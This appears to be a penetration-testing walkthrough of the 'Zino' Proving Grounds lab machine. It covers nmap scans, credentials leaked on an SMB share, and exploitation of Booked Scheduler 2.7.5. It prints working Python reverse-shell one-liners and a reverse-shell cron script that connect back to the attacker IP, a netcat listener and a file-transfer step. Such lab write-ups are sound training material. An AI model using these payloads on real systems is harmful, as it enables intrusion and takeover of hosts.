# Proving Grounds - Zino - 192.168.250.64

# Enumeration
## Nmap

Machine prevents nmap ping sweep. Need -Pn tag to run

### Inital Scan
Command
```
nmap -A -vv -Pn -oA enum/nmap-initial 192.168.250.64
```

Output
```
PORT     STATE SERVICE     REASON  VERSION                                                                                                                                                                                                   
21/tcp   open  ftp         syn-ack vsftpd 3.0.3                                                                                                                                                                                              
22/tcp   open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                               
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)                                                                                                                                                                               
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO
9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB                                                                                            
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)                                                                                                                                                                              
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY=                                                                           
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)                                                                                                                                                                            
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK                                                                                                                                                           
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                                               
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)                                                                                                                                                            
3306/tcp open  mysql?      syn-ack                                                                                                                                                                                                           
| fingerprint-strings:                                                                                                                                                                                                                       
|   GetRequest, Help, NULL:                                                                                                                                                                                                                  
|_    Host '192.168.49.250' is not allowed to connect to this MariaDB server                                                                                                                                                                 
| mysql-info:                                                                                                                                                                                                                                
|_  MySQL Error: Host '192.168.49.250' is not allowed to connect to this MariaDB server                                                                                                                                                      
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=9/24%Time=614E8082%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetReques
SF:t,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4D,"I
SF:\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Host: ZINO; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20896/tcp): CLEAN (Timeout)
|   Check 2 (port 50055/tcp): CLEAN (Timeout)
|   Check 3 (port 64856/udp): CLEAN (Timeout)
|   Check 4 (port 21134/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2021-09-24T21:51:10-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-25T01:51:13
|_  start_date: N/A
```

### Full Scan
Command
```
nmap -A -vv -Pn -p- -oA enum/nmap-full 192.168.250.64
```

Output
```
PORT     STATE SERVICE     REASON  VERSION                                                                                                                                                                                                   
21/tcp   open  ftp         syn-ack vsftpd 3.0.3                                                                                                                                                                                              
22/tcp   open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                               
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)                                                                                                                                                                               
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO
9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB                                                                                            
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)                                                                                                                                                                              
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY=                                                                           
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)                                                                                                                                                                            
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK                                                                                                                                                           
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                                               
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)                                                                                                                                                            
3306/tcp open  mysql?      syn-ack                                                                                                                                                                                                           
| fingerprint-strings:                                                                                                                                                                                                                       
|   NULL, NotesRPC, WMSRequest, X11Probe:                                                                                                                                                                                                    
|_    Host '192.168.49.250' is not allowed to connect to this MariaDB server                                                                                                                                                                 
| mysql-info:                                                                                                                                                                                                                                
|_  MySQL Error: Host '192.168.49.250' is not allowed to connect to this MariaDB server                                                                                                                                                      
8003/tcp open  http        syn-ack Apache httpd 2.4.38                                                                                                                                                                                       
| http-ls: Volume /                                                                                                                                                                                                                          
| SIZE  TIME              FILENAME                                                                                                                                                                                                           
| -     2019-02-05 21:02  booked/                                                                                                                                                                                                            
|_                                                                                                                                                                                                                                           
| http-methods:                                                                                                                                                                                                                              
|_  Supported Methods: GET POST OPTIONS HEAD                                                                                                                                                                                                 
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                                                 
|_http-title: Index of /                                                                                                                                                                                                                     
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                 
SF-Port3306-TCP:V=7.91%I=7%D=9/24%Time=614E8176%P=x86_64-pc-linux-gnu%r(NU                                                                                                                                                                   
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4D,
SF:"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4D,"
SF:I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.250'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20896/tcp): CLEAN (Timeout)
|   Check 2 (port 50055/tcp): CLEAN (Timeout)
|   Check 3 (port 64856/udp): CLEAN (Timeout)
|   Check 4 (port 21134/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2021-09-24T21:55:16-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-25T01:55:18
|_  start_date: N/A

```

## Port 8003
![](../Attachments/Pasted%20image%2020210924212003.png)
![](../Attachments/Pasted%20image%2020210924212019.png)
### Nikto
Command
```

```

Output
```

```

### GoBuster
Command
```

```

Output
```

```

## Port 139/445 SMB
Command
```
smbmap -H 192.168.250.64
```
![](../Attachments/Pasted%20image%2020210924205523.png)

Connection to SMB zino share
```
smbclient //192.168.250.64/zino
```
![](../Attachments/Pasted%20image%2020210924205652.png)

misc.log details

![](../Attachments/Pasted%20image%2020210924210427.png)

Username and Password exposed
```
admin:adminadmin
```

---

# Vulnerabilities

Access to the admin page using the "admin:adminadmin" credentials found in misc.log file on the SMB server.
![](../Attachments/Pasted%20image%2020210924212307.png)

Version exposed on the admin portal
![](../Attachments/Pasted%20image%2020210924213100.png)

Looking over the Metasploit vulnerability for Booked Scheduler v2.7.5 there is a RCE vulnerability in the favicon upload.
```
https://www.exploit-db.com/exploits/46486
```

F-Masood did a good write up on this.
https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF

Sent python reverse shell using webshell in Burp(Need to use a port already open on machine to bypass firewall rules)
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.250",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
![](../Attachments/Pasted%20image%2020210924231236.png)

Access to Machine with www-data user
![](../Attachments/Pasted%20image%2020210924231324.png)

Database Password exposed
![](../Attachments/Pasted%20image%2020210924231536.png)
```
booked_user:RoachSmallDudgeon368
```

---

# Privilege Escalation
Crontab scipt runs every 3 minutes with Read, Write access.
![](../Attachments/Pasted%20image%2020210924232659.png)

Created a python reverse shell called cleanup.py.
```
#!/usr/bin/env python
import socket
import os
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.250",21));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
![](../Attachments/Pasted%20image%2020210924235343.png)

Removed old cleanup.py script
```
rm cleanup.py
```


Set up python http server on port 8003(again to bypass the firewall rules).
```
python3 -m http.server 8003
```
![](../Attachments/Pasted%20image%2020210924235241.png)

Used wget to transfer python script to target.
![](../Attachments/Pasted%20image%2020210924235226.png)

Set up listener on port 21 and waited for call back from cleanup.py
```
nc -nlvp 21
```

Root shell gained
![](../Attachments/Pasted%20image%2020210924235500.png)

---

# Loot
## User
>22f117a489c0b2d2d9823a90291a803a

Command
```
ifconfig;id;hostname;cat local.txt
```
![](../Attachments/Pasted%20image%2020210924235623.png)

## Root/Admin
>afd5c38e659084f687a3253df9bb9df3

Command
```
ifconfig;id;hostname;cat proof.txt
```
![](../Attachments/Pasted%20image%2020210924235739.png)